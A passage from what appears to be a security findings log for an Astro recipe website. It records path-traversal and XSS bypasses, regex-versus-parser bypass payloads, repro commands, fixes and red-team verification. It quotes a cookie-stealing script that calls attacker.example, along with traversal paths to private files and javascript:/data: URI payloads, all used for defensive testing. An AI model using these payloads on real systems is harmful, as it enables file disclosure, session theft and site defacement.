| RT-2026-09-06-06 | medium | scripts/preserve-build.js:151 (`sanitizeMarkdownContent`) / :180 (`validateRecipeFrontmatter`) — neither validates markdown *body* image destinations; scripts/sanitize-url-schemes.mjs:45 allows every scheme-less/relative destination by design | fixed-pending-verification | 2026-09-06 | **Build-machine arbitrary local image disclosure + permanent build DoS via unvalidated markdown image destinations.** Found while red-teaming the new AST URL-scheme plugin. The plugin (correctly, for XSS) treats every scheme-less/relative `src` as safe, and `validateRecipeFrontmatter()` only inspects frontmatter — nothing anywhere validates the *path* a relative markdown image points at. Astro/Sätteri turns a relative markdown image destination into a real Vite `import` of that file (`@astrojs/markdown-satteri`'s `collect-images` mdast plugin adds any non-`/`-prefixed, non-absolute-URL image URL to `localImagePaths`, then `image-marker` emits `__ASTRO_IMAGE_` and astro's `vite-plugin-markdown` imports it). The import path is not confined to the project root, so anyone who can land a commit in the untrusted `Silassentinel/Recipes` repo — the same threat model as RT-2026-07-30-01 — gets two things. **(a) Exfiltration.** `![x](../../../../../../../../home/<user>/Pictures/private.png)` makes the build read that file off the maintainer's workstation, run it through sharp, and emit it into the build output, which is `outDir: ../silassentinel.github.io/` — the GitHub Pages deploy repo — i.e. it is committed and published on the public internet, with the original basename preserved in the asset filename. Limited to formats astro's image service accepts (jpeg/jpg/png/tiff/webp/gif/svg/avif), but that includes SVG, and the build's success/failure is also a file-existence oracle for arbitrary paths. **(b) Denial of service.** Any unresolvable relative image destination — including an honest typo, e.g. `![x](./photo.png)` where the file was never committed — aborts `astro build` with `[UNRESOLVED_IMPORT] Could not resolve ... Module not found` and exit code 1, and a resolvable-but-non-image path (e.g. `![x](../../../package.json)`) aborts with `UnsupportedImageFormat`. `npm run build` then never publishes again until a human edits the external repo. The `finally`-block restore from RT-2026-07-30-02 means `.git`/`CNAME` survive, so impact is availability + disclosure, not destruction. REPRO (all executed in a scratch copy with `node_modules` symlinked so `outDir` resolved to a scratch parent, never the real deploy repo): (1) confirm the payload passes every existing control — `node --input-type=module -e "import * as PB from './scripts/preserve-build.js'; const b='---\nlayout: ../../layout/Post/MarkdownPostLayout.astro\ntitle: x\nauthor: x\ndescription: x\npubDate: 2026-09-06\ntags: [\"BBQ\"]\n---\n\n![p](../../../../../../../../home/victim/Pictures/private.png)'; console.log(PB.sanitizeMarkdownContent(b)===b, JSON.stringify(PB.validateRecipeFrontmatter(PB.sanitizeMarkdownContent(b),'X.md')));"` → `true {"valid":true}` (content unchanged, frontmatter accepted). (2) exfiltration — place a real PNG *outside* the project root (`<scratch>/secretdir/priv.png`), write `src/pages/posts/IMGTEST.md` with valid recipe frontmatter and body `![deeptrav](../../../../../../../../../../../../../../../..<abs path>/secretdir/priv.png)`, run `npx astro build`: exit 0, and `posts/IMGTEST/index.html` contains `<img src="/_astro/priv.5vcyeoBI_ICnKv.webp" alt="deeptrav" ...>` with the 96-byte converted file present at `<outDir>/_astro/priv.5vcyeoBI_ICnKv.webp`. Sixteen `../` segments were used; path normalisation clamps at `/`, so depth is unlimited. (3) DoS — same file with body `![trav](../../../../../../../../etc/hostname)`: `npx astro build` exits **1** with `[UNRESOLVED_IMPORT] Could not resolve '../../../../../../../../etc/hostname' in src/pages/posts/IMGTEST.md`. Body `![inproj](../../../package.json)`: exits **1** with `UnsupportedImageFormat: Received unsupported format \`undefined\``. A clean build of the same tree exits 0 (208 pages). Note this is *not* a regression of the e18c5a7 URL-scheme fix — allowing relative destinations is the right call for the XSS control — it is a separate, pre-existing trust boundary that no filed finding covers (RT-2026-09-06-02 allow-listed the `layout:` frontmatter path but not body image paths). Remediation direction: validate markdown body image/link destinations in the same AST plugin (reject any relative destination that escapes the posts directory, e.g. resolve against the file path and require containment), or reject fetched recipes whose body contains a relative image destination at all (no currently-published recipe uses one — all 34 real files reference only remote `https:` images or none). | **Fix (2026-09-06):** Confirmed via a direct check of every real file under `src/pages/posts/` that none of the 34 currently-published recipes use markdown image syntax (`![...]( ...)`) at all — no legitimate relative-image use case exists in production today — so per the finding's own calibration guidance the fix is a strict allow-list rather than a path-containment check. Added `validateMarkdownImageDestinations()` in `scripts/preserve-build.js`, called from `validateRecipeFrontmatter()` against the markdown *body* only (via `gray-matter`'s already-parsed `parsed.content`, i.e. after frontmatter is stripped) before a recipe is ever written to `src/pages/posts/` — the same validation layer, and running strictly before Astro's build (and therefore before Sätteri's `collect-images` mdast plugin, which is what actually turns a relative image destination into a Vite import; this could not be caught by the existing `scripts/sanitize-url-schemes.mjs` AST plugin, since that plugin only sees the already-rendered `<a>`/`<img>` HTML *after* the local-image collection/import step has already happened). The function scans for every `![...]` marker in the body and requires it to be immediately followed by a fully-qualified `http:`/`https:` destination (case-insensitive, optional `<...>` wrapping and title, per CommonMark's inline-image syntax); anything else — a relative path, protocol-relative URL, `data:`/`javascript:` URI, or reference-style image (whose destination lives in a separate, harder-to-validate-inline `[label]: url` definition) — causes the whole recipe to be rejected with a clear reason string, matching the same fail-closed philosophy as `isSafeLayout`. Verified against the exact repro payload (`![p](../../../../../../../../home/victim/Pictures/private.png)`) — rejected with `"Markdown image destination must be a fully-qualified http(s) URL..."` — and against the DoS-typo repro (`![x](./photo.png)`), a protocol-relative destination, and a `data:` URI, all rejected; a legitimate `![p](https://example.com/photo.png)` (with and without a title) is accepted; re-ran the check over all 34 real published recipe files and confirmed zero are rejected for image reasons (none use image syntax, so nothing to false-positive on). Tests: `test/ts/PreserveBuild.test.ts` (`validateRecipeFrontmatter` describe block — exact path-traversal repro, unresolvable relative path, protocol-relative, `data:` URI, legitimate remote image with/without title, and the real "no images at all" baseline). Still `fixed-pending-verification`, not `fixed` — red-team verifies next. **Red-team verification 2026-09-06 (fourth pass) — FIX DOES NOT HOLD, reverted to `open`.** `validateMarkdownImageDestinations()` is again a regex over markdown *source* that disagrees with the real CommonMark parser, i.e. the exact mistake class of RT-2026-09-06-04 recurring a third time in this file. Its marker pattern `/!\[[^\]]*\]/g` terminates the alt text at the **first** `]`, but CommonMark terminates it at the first *unescaped, unbalanced* `]`, so a backslash-escaped `]` (or a nested image) inside the alt text makes the validator read a decoy `(https://...)` as the destination while the parser reads the real one that follows. Eight payload shapes confirmed bypassing, and the full RT-2026-09-06-06 impact (local file exfiltration published into the public deploy repo, plus permanent build DoS) reproduced end-to-end after the fix. Filed as **RT-2026-09-06-08**; see that row for repro. | **Fix (2026-09-06, round 5):** Per red-team's own remediation direction (three consecutive rounds of regex-vs-parser bypasses is the pattern, not the payload), stopped trying to validate markdown image destinations entirely. `validateMarkdownImageDestinations()` in `scripts/preserve-build.js` now rejects any recipe body containing the literal two-character sequence `![` anywhere, full stop — no attempt to parse or classify the destination, so there is nothing left for a regex to disagree with the real CommonMark/Sätteri parser about. Rejection reason: "Recipe images are not currently supported — remove any markdown image syntax". If recipe markdown images become a real, needed feature, that is a separate feature-plus-proper-fix (e.g. a Sätteri mdast `image(node)` hook operating on the already-resolved `node.url`) to be scoped deliberately, not something to half-solve here. Tests: `test/ts/PreserveBuild.test.ts` — original RT-2026-09-06-06 repro rejected, all 8 RT-2026-09-06-08 bypass payloads rejected (new `describe('RT-2026-09-06-08: all 8 confirmed bypass payloads are rejected outright')` block, `test.each`), a syntactically-legitimate remote `https://` image destination is now *also* rejected (documented as the deliberate new behavior), and a new test reads every real file under `src/pages/posts/` and asserts none contain `![` (confirms the "no real recipe uses images" premise holds against the actual 34 files on disk, not just as claimed). Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
| RT-2026-09-06-07 | low | test/ts/UrlSchemeSanitizerPlugin.test.ts:196-215 | fixed | 2026-09-06 | **Regression of the RT-2026-09-06-03 test-pollution class, reintroduced by the same commit that fixed it elsewhere.** The new end-to-end suite writes a real file into the tracked source tree — `fs.writeFileSync(path.join(projectRoot, 'src/pages/posts', 'URL-SANITIZER-PLUGIN-TEST-TEMP.md'), ...)` in `beforeAll`, removed only in `afterAll`. If the run is interrupted at any point during the ~10 s `astro build` that follows (Ctrl-C, CI timeout/OOM, a worker crash), `afterAll` never executes and the file survives. Because RT-2026-07-30-03's fix made `src/pages/posts/` gitignored *and* untracked, `git status` shows nothing, and `scripts/preserve-build.js`'s `fetchRecipes()` only ever *writes* into that directory — it never prunes it — so the stale test page is picked up by the next `npm run build` and published to benjamindegryse.be as `/posts/URL-SANITIZER-PLUGIN-TEST-TEMP/`, complete with its `#blocked-by-sanitizer` probe links. Impact is cosmetic/reputational, not exploitable, hence low. This is the same failure mode blue-team just fixed in `test/ts/RecipeFetcher.test.ts` (which now uses `fs.mkdtempSync`); `test/ts/GitignorePosts.test.ts:27` and `test/ts/CspBuild.test.ts:36` (which writes `astro.config.csp-regression-test.mjs` into the project root) have the same shape but shorter windows. REPRO (in a byte-identical scratch copy, never the real repo): `ls src/pages/posts | wc -l` → 34; start `npx jest --ci --runTestsByPath test/ts/UrlSchemeSanitizerPlugin.test.ts &`, poll until `src/pages/posts/URL-SANITIZER-PLUGIN-TEST-TEMP.md` appears (observed ~1.8 s in), then `kill -9` the jest process group; afterwards the file is still there (586 bytes), `ls src/pages/posts | wc -l` → 35, and `git status --porcelain src/pages/posts` prints **nothing**. Remediation direction: same as RT-2026-09-06-03 — build from an `fs.mkdtempSync` copy of the project (or pass a `--root`/config whose `pages` dir is the temp copy) rather than mutating the real `src/pages/posts/`. | **Fix (2026-09-06):** Rewrote the end-to-end `describe` block in `test/ts/UrlSchemeSanitizerPlugin.test.ts` to build from a fully isolated `fs.mkdtempSync` copy of the whole project (its own root, so Astro's `.astro` cache/`srcDir`/`outDir` all resolve underneath it — a plain `srcDir`-only override while keeping the real project root was tried first and breaks Astro's Vite integration with an unrelated `"No cached compile metadata found"` error, so the fix copies `src/` and `public/`, symlinks `node_modules`, and copies `package.json`/`tsconfig.json` into a scratch root, matching the "copy the whole project" pattern already used by `test/ts/PreserveBuild.test.ts`'s end-to-end suite). The test recipe is now written only inside that scratch copy's `src/pages/posts/`, never the real one; a new assertion (`'the real src/pages/posts/ directory was never written to'`) directly checks `fs.existsSync` on the real path is `false` after the build. Verified the fix closes the exact repro: ran the suite to completion and confirmed `ls src/pages/posts | wc -l` is unchanged at 34 with no `URL-SANITIZER-PLUGIN-TEST-TEMP.md` present; because the real directory is now never touched at all (not "written then cleaned up"), there is no window in which a mid-build kill could leave a stray file behind — the failure mode is structurally eliminated, not just raced against. Test: `test/ts/UrlSchemeSanitizerPlugin.test.ts` ("end-to-end" describe block). Still `fixed-pending-verification`, not `fixed` — red-team verifies next. **Red-team verification 2026-09-06 (fourth pass) — verified `fixed` for this file.** The end-to-end suite now builds entirely inside an `fs.mkdtempSync` project root (`scratchProjectDir`); the only reference to the real `src/pages/posts/` is a read (`fs.cpSync` source) and an `fs.existsSync` assertion — there is no `writeFileSync` targeting the real directory anywhere in the file, so the mid-run-kill window is structurally gone, not raced against. Confirmed by running the full suite three times in the **real** repo (not a copy) while polling the real `src/pages/posts/`: file count stayed at 34 and `ls | md5sum` stayed at `87fbd0e010a93ad613686d1e8997c4a3` before, during and after all three runs; deploy repo HEAD unchanged at `3645472`. Note the *class* is not fully eliminated repo-wide — `test/ts/GitignorePosts.test.ts:27` still writes a real frontmatter-less file into the real tracked `src/pages/posts/`; filed separately as **RT-2026-09-06-09**. |
| RT-2026-09-06-08 | medium | scripts/preserve-build.js:248-263 (`validateMarkdownImageDestinations`) | fixed-pending-verification | 2026-09-06 | **Bypass of the 97db018 RT-2026-09-06-06 fix — arbitrary local-file exfiltration and permanent build DoS are both still live.** The new `validateMarkdownImageDestinations()` finds image markers with `/!\[[^\]]*\]/g` and then requires the text immediately after that match to be `(https?://...)`. The marker regex's `[^\]]*` stops at the **first** `]` in the document; CommonMark's inline parser stops at the first `]` that is neither backslash-escaped nor part of a balanced pair, and (unlike links) permits images nested inside image alt text. So a decoy `](https://ok.example/i.png)` placed where the regex expects the destination satisfies the validator, while the parser treats that whole span as alt text and takes the *following* parenthesised string as the real destination. Sätteri's `collect-images` mdast hook (`node_modules/@astrojs/markdown-satteri/dist/satteri-processor.js:19-30`) then adds that destination to `localImagePaths`, and astro's `vite-plugin-markdown` emits a literal `import` of it with no project-root confinement — the exact primitive RT-2026-09-06-06 described. A third, independent mechanism: the validator only checks that the destination *starts with* `https?://`, while `collect-images` classifies remote-vs-local with `URL.canParse()`, so a string that begins with `https://` but is not a parseable URL (e.g. `https://[/...`) is accepted by the validator and routed to the **local** branch. **Eight confirmed bypass shapes** (validator `{"valid":true}` **and** non-empty `localImagePaths` from a real `@astrojs/markdown-satteri@0.3.4` render): `![a\](http://x/)](../EVIL.png)`; the same with a deep traversal path; `![z ![i](http://x/i.png)](../EVIL.png)`; a deep-traversal nested variant; triple-nested `![p ![q ![r](http://x/)](http://y/)](../EVIL.png)`; escaped-`]` with a title `![a\](http://x/ "t")](../EVIL.png)`; two escaped-`]` images on one line (both destinations collected); and `![p](https://[/EVIL.png)`. An escaped-`]` image nested inside a link (`[![a\](http://x/)](../EVIL.png)](http://z/)`) works too. **REPRO (all run in a throwaway rsync copy with `node_modules` symlinked, so `outDir: ../silassentinel.github.io/` resolved to a scratch parent — the real deploy repo and the real `src/pages/posts/` were never written to):** (1) *validator bypass* — `node -e` importing `scripts/preserve-build.js`, body `![a\](https://ok.example/i.png)](../../../../../../../../etc/hostname)` with valid recipe frontmatter (quoted `pubDate`): `sanitizeMarkdownContent` returns the content **byte-for-byte unchanged** and `validateRecipeFrontmatter` returns `{"valid":true}`. (2) *exfiltration, end-to-end* — put a real 80-byte PNG at `<scratch>/secretdir/priv.png` (outside the project root), write `src/pages/posts/IMGBYPASS.md` with valid frontmatter and body `![a\](https://ok.example/i.png)](<20x ../><abs path>/secretdir/priv.png)`, run `npx astro build`: **exit 0**, 208 pages, and `posts/IMGBYPASS/index.html` contains `<img src="/_astro/priv.fvFiq6OF_Z19zlWX.webp" alt="a](https://ok.example/i.png)" ... width="10" height="10">` with the converted 114-byte file present at `<outDir>/_astro/priv.fvFiq6OF_Z19zlWX.webp` — i.e. the private file is read off the build machine and committed into the public GitHub Pages deploy repo, original basename preserved. (3) *build DoS* — same file, body `![a\](https://ok.example/i.png)](../../../../../../../../etc/hostname)`: `npx astro build` exits **1** with `[UNRESOLVED_IMPORT] Could not resolve '../../../../../../../../etc/hostname'`; body `...](../../../package.json)` exits **1** with `UnsupportedImageFormat`; the nested-image variant `![alt ![inner](https://ok.example/i.png)](../../../../../../../../etc/hostname)` gives the identical `UNRESOLVED_IMPORT`; and `![p](https://[/<24x ../><abs path>)` exits **1** on module resolution. A clean build of the same tree exits 0. **Checked and NOT exploitable** (so the fix is not wholly ineffective): plain relative path, `./photo.png` typo, protocol-relative `//attacker.example/x.png`, `data:` URI, `https\://`, and uppercase-hex `&#X2E;&#X2E;/x.png` are all correctly rejected; and `![p](https://good.example/../../../etc/passwd)` is accepted but is genuinely harmless — `URL.canParse` succeeds so `collect-images` routes it to `remoteImagePaths`, `isRemoteAllowed` returns false with the empty `image.domains`/`remotePatterns` config, nothing is fetched at build time, and the destination is emitted as a plain `<img src="https://good.example/../../../etc/passwd">`. So the `https://`-prefix-then-traversal idea is a dead end; the live vectors are the alt-text/parser-divergence ones above. Remediation direction: the same lesson as RT-2026-09-06-04 — stop pattern-matching markdown source. The check has to run where the destination is already resolved. Because Sätteri's `collect-images` hook fires *before* any hast plugin, the correct hook is a Sätteri **mdast** plugin (an `image(node)` hook, same shape `collect-images` itself uses) that rejects/neutralises `node.url` unless it is a fully-qualified `http:`/`https:` URL; alternatively pre-parse the body with the same markdown parser in `validateRecipeFrontmatter()` and walk for `image` nodes rather than regexing. A cheap belt-and-braces stopgap that does hold against all eight payloads: reject any recipe whose body contains the two-character sequence `![` at all (no real recipe uses image syntax — the same all-or-nothing calibration blue-team already applied, but keyed on a token the parser and the validator cannot disagree about). | **Fix (2026-09-06, round 5):** Implemented exactly the belt-and-braces stopgap red-team suggested. `validateMarkdownImageDestinations()` no longer attempts to locate an image marker and check its destination; it rejects any recipe body containing `![` anywhere, so all 8 bypass payloads (escaped-`]`, nested/triple-nested images, the `https://[/...`-unparseable-destination variant) are rejected trivially — none of them can avoid containing that literal sequence. Tests: `test/ts/PreserveBuild.test.ts`, `describe('RT-2026-09-06-08: all 8 confirmed bypass payloads are rejected outright')`, one `test.each` case per payload shape from this row's repro, plus the pre-existing RT-2026-09-06-06 repro test and a real-file sweep of all 34 published recipes. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |
| RT-2026-09-06-09 | low | test/ts/GitignorePosts.test.ts:26-42 | fixed-pending-verification | 2026-09-06 | **Residual of the RT-2026-09-06-03 / RT-2026-09-06-07 test-pollution class: `npm test` still writes a real, build-breaking, git-invisible file into the tracked `src/pages/posts/`.** Blue-team moved `UrlSchemeSanitizerPlugin.test.ts` and `RecipeFetcher.test.ts` off the real directory, but `GitignorePosts.test.ts:27` still does `fs.writeFileSync(path.join(projectRoot, 'src/pages/posts', '__gitignore-regression-test.md'), '# temp file for gitignore regression test\n')` and only removes it in a `finally`. The file has no frontmatter, so if the process dies inside that window (Ctrl-C, CI timeout/OOM, worker crash) the next `npm run build` fails at `@astrojs/rss`'s `pagesGlobToRssItems` — the exact RT-2026-09-06-03 failure mode — and because RT-2026-07-30-03's fix made the directory gitignored **and** untracked, `git status` shows nothing. Impact is availability/hygiene on the maintainer's machine only, hence low, and the window is milliseconds rather than the ~10 s of RT-2026-09-06-07, but the class is not eliminated, only shortened. A secondary consequence: `UrlSchemeSanitizerPlugin.test.ts:218` does `fs.cpSync(projectRoot/src, scratch/src)` in a parallel jest worker, so if the copy lands inside that window the scratch build inherits a frontmatter-less page and the suite flakes — the same cross-suite TOCTOU shape as RT-2026-09-06-03 (not observed in three runs; hypothesis). REPRO (real repo, no writes by me): run a tight `[ -e src/pages/posts/__gitignore-regression-test.md ]` busy-poll in the background, then `npx jest --ci --runTestsByPath test/ts/GitignorePosts.test.ts` — the poll reports `SAW __gitignore-regression-test.md`, `ls src/pages/posts | wc -l` reads **35** at that instant (34 before and after), and `git check-ignore -v src/pages/posts/__gitignore-regression-test.md` matches `.gitignore:134:src/pages/posts/`, confirming it would be invisible to `git status`. Remediation direction: `git check-ignore` works on paths that do not exist on disk (it is a pattern check, not a stat check), so the test does not need to create the file at all — drop the `writeFileSync`/`rmSync` pair entirely, or run the check against a path under an `fs.mkdtempSync` clone as the other two suites now do. | **Fix (2026-09-06):** Confirmed the remediation direction's premise directly (`git check-ignore -v src/pages/posts/__nonexistent-check-test.md` on a path that has never existed on disk exits 0 and matches `.gitignore:134:src/pages/posts/`), then dropped the `writeFileSync`/`rmSync` pair entirely from `test/ts/GitignorePosts.test.ts` — the test now only calls `git check-ignore -v` against the path string and asserts, before and after, that `fs.existsSync` on the real path is `false`. The real tracked `src/pages/posts/` is never written to by this test, matching the pattern already established for `RecipeFetcher.test.ts` (RT-2026-09-06-03) and `UrlSchemeSanitizerPlugin.test.ts` (RT-2026-09-06-07) — structurally eliminating the window rather than shortening it. Test: `test/ts/GitignorePosts.test.ts`, `'a new file under src/pages/posts would be ignored by git (repro from RT-2026-07-30-03), without creating any real file'`. Ran `npx jest --ci` three times back to back; `src/pages/posts` stayed at exactly 34 files throughout every run. Still `fixed-pending-verification`, not `fixed` — red-team verifies next. |


## Red-team verification 2026-09-06 (re-derivation of commit 353e8aa)

All work below was done in throwaway copies under the session scratchpad
(`.../scratchpad/proj/` and `.../scratchpad/p2/`) with `node_modules` symlinked
and `outDir: ../silassentinel.github.io/` therefore resolving to a *scratch*
parent directory. The real `/home/silassentinel/code/website/silassentinel.github.io`
deploy repo and the real `src/pages/posts/` recipes were not written to.
Snyk MCP tools were unavailable (`snyk_sca_scan`: "folder is not trusted";
`snyk_code_scan`: "User not authenticated"), so dependency verification was
done with `npm ls` / `npm audit`.

- **RT-2026-07-30-01 — NOT fully fixed, left `open`.** The raw-HTML half is
  genuinely fixed: the exact original payload
  `<script>fetch('https://attacker.example/steal?d='+document.cookie)</script><img src=x onerror="...DEFACED...">`
  comes out of `sanitizeMarkdownContent()` as `&lt;script>...&lt;img src=x onerror=...`,
  and after a real `npx astro build` the page `posts/EVIL-recipe/index.html`
  renders it as inert visible text (`&lt;script&gt;...&lt;/script&gt;`, no live
  tags). Bypass attempts that all failed (i.e. the sanitizer held): case
  variation `<ScRiPt>`, `<svg onload=alert(1)>`, the
  `<math><mtext><table><mglyph><style><img onerror=>` mXSS chain, comment `<!--`
  and PI `<?` openers, HTML-entity double-encoding `&lt;script&gt;`, numeric
  references `&#60;script&#62;` (re-encoded to `&#x3C;` on output), and
  `< script>` / `<\nscript>` (not tag starts for an HTML parser either).
  `src/layout/Post/MarkdownPostLayout.astro` uses no `set:html`, and the only
  `innerHTML` in `src/` is a hardcoded `&nbsp;` string in `ChaosMode.ts:485`.
  The CSP is real and correct as far as it goes: every built page carries
  `<meta http-equiv="content-security-policy" content="script-src 'self' 'sha256-...'; style-src 'self' 'sha256-...'">`
  with no `unsafe-inline` (note it is lowercase `http-equiv` content, so a
  case-sensitive grep for `Content-Security-Policy` misses it). **However** the
  sanitizer does not touch markdown link/image URLs, giving a working
  `javascript:` / `data:` URI stored-XSS path — filed as RT-2026-09-06-01 — and
  the CSP has no `default-src` / `object-src` / `base-uri`. Separately, the fix
  is **not deployed**: the live site and
  `../silassentinel.github.io/index.html` contain no CSP meta tag and
  `https://benjamindegryse.be/tags/burgers%22/` still returns 200.
- **RT-2026-07-30-02 — verified `fixed`.** Seeded a scratch deploy dir with
  `.git/HEAD`, `.git/config` (sentinel contents), `CNAME`, `.nojekyll`; forced a
  *real* Astro rendering failure (a `src/pages/boom.astro` that throws in its
  frontmatter script — not the test's `PRESERVE_BUILD_COMMAND` shortcut); ran
  `node scripts/preserve-build.js`. Astro cleared `outDir` and the build exited
  non-zero, the `catch` set `process.exitCode = 1`, and the `finally` block ran
  `restorePreservedFiles()` — `.git/config` came back with its sentinel content,
  `CNAME` and `.nojekyll` intact. Script exit code is 1 (checked directly, not
  through a pipeline). Confirmed for reference that a bare `npx astro build`
  *does* delete `outDir/.git`, so the restore is doing real work.
  `validateRecipeFrontmatter()` rejects every originally-named bad input:
  missing `title`/`pubDate`/`layout`/`author`/`description`, `pubDate: 'not-a-date'`,
  `tags: "BBQ"` (non-array), `tags: [null]`, `tags: [["a"]]`, broken flow-sequence
  YAML, `../../../../PWNED-TRAVERSAL`, `burgers"`; it also correctly rejects the
  real on-disk `src/pages/posts/Smoked-bacon-burgers.md`. Residual crash/hang
  vectors that validation still misses are filed separately as RT-2026-09-06-02.
- **RT-2026-07-30-03 — verified `fixed`.** In the real repo,
  `git check-ignore -v src/pages/posts/bbq.md` → `.gitignore:134:src/pages/posts/	src/pages/posts/bbq.md`
  (exit 0), and `git ls-files src/pages/posts | wc -l` → 0. Side effect worth
  knowing: build-breaking junk dropped into that directory is now invisible to
  `git status` (see RT-2026-09-06-03).
- **RT-2026-07-30-04 — verified `fixed`.** `npm ls sharp` → `astro@7.1.3 └── sharp@0.35.4`.
  `npm audit` output contains no `sharp`/`libvips`/CVE-2026-33327/33328/35590/35591
  matches. Remaining audit noise is 6 unrelated advisories (`fast-uri`, `js-yaml`,
  `nanoid`, `postcss`) — one of which, `js-yaml@3.15.0` under `gray-matter`, is
  newly *reachable from untrusted input* because of the RT-02 fix; see
  RT-2026-09-06-02.
- **RT-2026-09-05-01 — verified `fixed`.** `astro.config.mjs:5` is
  `site: 'https://benjamindegryse.be/'`; no `astrogettingstarted.netlify.app`
  string remains anywhere in the config.
- **RT-2026-09-05-02 — verified `fixed`.** `isValidTagSlug`/`isSafeTag` reject
  `../../../../PWNED-TRAVERSAL`, `burgers"`, `a/b`, `.`, `..`, and a RTL-override
  control character; they accept real production tags including spaces, mixed
  case and digits (`Light course`, `Dry Rub`, `Apple Cider`, `Peanut buttersauce`,
  `No-Cook`, `30-Minutes`). Extracted all 167 unique tags from the 34 real fetched
  recipes and ran them against `^[A-Za-z0-9 _-]+$`: **zero** legitimate tags are
  rejected. A clean scratch `astro build` produced 207 HTML pages and 168
  entries under `tags/` (167 tag pages + the index), with no directory
  containing a quote character — the malformed `burgers"` page is gone while
  `tags/burgers/` still builds. Minor inconsistency, not filed: `isSafeTag` in
  `preserve-build.js` accepts an all-whitespace tag (`"   "`) that `isValidTagSlug`
  in `tagUtils.ts` rejects (it trims first); the stricter one runs last, so the
  net behaviour is safe.
- **Test suite.** `npx jest --ci` on the real repo across three runs:
  `20 failed / 8 passed`, `20 failed / 8 passed`, `19 failed / 9 passed` (28
  suites; the pre-existing baseline plus the 5 new suites added by 353e8aa).
  The 19 pre-existing failures are unchanged (ESM/import and the
  `DynamicSubMenu.astro:17` type error). Four of the five new suites
  (`PreserveBuild`, `TagUtils`, `GitignorePosts`, `DependencyAndConfig`) pass
  consistently. `CspBuild.test.ts` is a **new intermittent failure** (2 of 3
  runs) caused by a cross-suite race, not by the CSP fix itself — filed as
  RT-2026-09-06-03. In a clean scratch copy it passes in the full run.
- **Non-security note (not filed).** `sanitizeMarkdownContent()` also breaks
  legitimate markdown autolinks: `<https://example.com>` becomes
  `&lt;https://example.com>` and renders as literal text instead of a link.



## Red-team verification 2026-09-06 (second pass — re-derivation of commit a8a2840)

Same methodology as the first pass: everything below was executed in throwaway
copies under the session scratchpad, with `node_modules` symlinked and
`outDir: ../silassentinel.github.io/` therefore resolving to a *scratch* parent
directory. The real `/home/silassentinel/code/website/silassentinel.github.io`
deploy repo was never touched and no file was written into the real
`src/pages/posts/`. Snyk MCP tools were again unavailable
(`snyk_code_scan`: "User not authenticated"; `snyk_sca_scan`: "folder is not
trusted"), so dependency verification was done with `npm ls` / `npm audit`.

- **RT-2026-07-30-01 / RT-2026-09-06-01 — BYPASS FOUND, reverted to `open`.**
  `sanitizeMarkdownUrls()` does correctly block every payload the previous
  findings named: `[CLICK-ME](javascript:alert(document.domain))`,
  `![img](javascript:alert(1))`, `java&#115;cript:`, `&#x6a;avascript:`,
  `data:text/html;base64,...`, `data:image/svg+xml;base64,...`, NUL-byte
  splicing, reference-style `[1]: javascript:...`, plus new attempts that also
  held: `vbscript:`, mixed-case `JaVaScRiPt:`, `<java\tscript:...>` (tab inside
  the scheme, angle-wrapped), entity tab/newline `java&#9;script:` /
  `java&#10;script:`, no-semicolon `&#106avascript:`, `[x](javascript:alert(1) "t")`
  with a title, angle-wrapped reference definitions, and multi-line labels.
  Non-exploitable near-misses (sanitizer lets them through but the browser will
  not execute them): `&amp;#106;avascript:` (single-decode only → relative URL),
  `&lt;javascript:...&gt;` (renders as `href="%3Cjavascript:..."`), fullwidth
  colon `javascript：` (renders `%EF%BC%9A`), `java&Tab;script:`
  (renders `java%09script:`), `<javascript :alert(1)>` (space breaks the scheme;
  markdown does not even produce a link). **But six payloads render as live
  `javascript:`/`data:` `href`/`src` in real built HTML** — backslash-escaped
  colon (link and image), uppercase-`X` hex reference (link and image),
  reference definition inside a blockquote/list item, and a reference label with
  an escaped `]`. Filed as **RT-2026-09-06-04**, and RT-2026-07-30-01 /
  RT-2026-09-06-01 are reverted from `fixed-pending-verification` to `open`
  because their stored-XSS impact is unchanged. The raw-HTML half remains
  correctly fixed (re-checked `<a href="javascript:...">` → `&lt;a href=...`,
  and the `<javascript:alert(1)>` autolink → `&lt;javascript:alert(1)&gt;`).
  Blue-team's `java\tscript:` claim is **verified independently**: rendering
  `[x](java\tscript:alert(1))` (real embedded tab, unwrapped) through the real
  `@astrojs/markdown-satteri@0.3.4` processor produces the literal text
  `<p>[x](java	tscript:alert(1))</p>` — no `<a>` element at all, so CommonMark
  really does break the link before an `href` is ever emitted.
  **Zero false positives confirmed**: ran `sanitizeMarkdownUrls()` over all 34
  real files in `src/pages/posts/` — `changed: 0`, every file byte-identical.
  (One file, `Smoked-bacon-burgers.md`, is still rejected by
  `validateRecipeFrontmatter` for its pre-existing malformed `burgers"` tag —
  that is RT-2026-09-05-02 working as designed, not a new false positive.)
  The `#blocked-by-sanitizer` placeholder itself is inert and not confusable —
  it is a fixed literal, cannot be broken out of, and renders as a same-page
  fragment link. Cosmetic only: a destination with nested parens leaves residue
  (`[x](javascript:alert((1)))` → `href="#blocked-by-sanitizer((1))"`), still
  inert. A separate quadratic-time regex problem in the same function is filed
  as **RT-2026-09-06-05**.
- **RT-2026-09-06-02 — verified `fixed`.** (a) `isSafeLayout()` rejects the exact
  repro `../../../../../../../../etc/passwd`
  (`{"valid":false,"reason":"Unsafe or unknown layout path: ..."}`), plus
  `/etc/passwd`, `..%2f..%2fetc/passwd`, `http://evil.example/x.astro`,
  `${process.env.HOME}` and even the project's own
  `../../layout/BaseLayout.astro`. All 34 real recipe files carry
  `layout: ../../layout/Post/MarkdownPostLayout.astro` and all 34 pass the
  layout check — no false positive breaking the real build.
  (b) `npm ls js-yaml` shows `gray-matter@4.0.3 └── js-yaml@3.15.2` (patched for
  GHSA-5p4m-2wfm-xmqj); `npm audit` still lists the advisory only for
  `astro@7.1.3` and `@astrojs/internal-helpers@0.10.1`'s own `js-yaml@4.3.0`,
  neither of which parses untrusted recipe content. Re-ran the original `!!omap`
  timing repro: 20k entries (269KB) → 36 ms (was 168 ms); 50k/100k/200k entries
  are now 689KB/1.4MB/2.9MB and are rejected in **0 ms** by the size cap before
  any parsing. Re-measured the true worst case *inside* the cap (maximum omap
  entries packed under 500KB): 72KB→7.6 ms, 144KB→8.5 ms, 288KB→13.8 ms —
  linear, not quadratic. Size-cap boundary is exact and off-by-one-correct:
  511,999 B and 512,000 B are parsed; 512,001 B and 512,100 B are rejected with
  `Recipe content exceeds maximum allowed size of 512000 bytes`. The same check
  is applied in `fetchRecipeContent()` immediately after the response body is
  read, before any parsing (code-verified at :110). Note the cap is
  *download-then-check*, so a large body is still buffered in memory before
